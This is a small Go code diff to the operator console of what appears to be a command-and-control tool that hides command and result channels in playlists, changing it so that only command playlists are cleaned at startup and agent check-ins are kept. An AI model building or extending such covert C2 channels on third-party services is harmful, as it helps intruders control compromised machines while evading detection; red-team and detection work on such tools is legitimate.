@@ -277,11 +277,9 @@ func (op *Operator) Interactive() {
 	fmt.Printf("  \033[36mPolling every %ds\033[0m | Type '\033[1mhelp\033[0m' for commands\n\n",
 		int(op.pollInterval.Seconds()))
 
-	// Clean stale playlists from prior sessions
+	// Clean stale COMMAND playlists only (not results — checkin lives there)
 	ctx := context.Background()
 	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
-	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
-	fmt.Println("  [*] Cleaned stale playlists from prior sessions")
 
 	// Initial check for pending checkins
 	op.checkForCheckins()
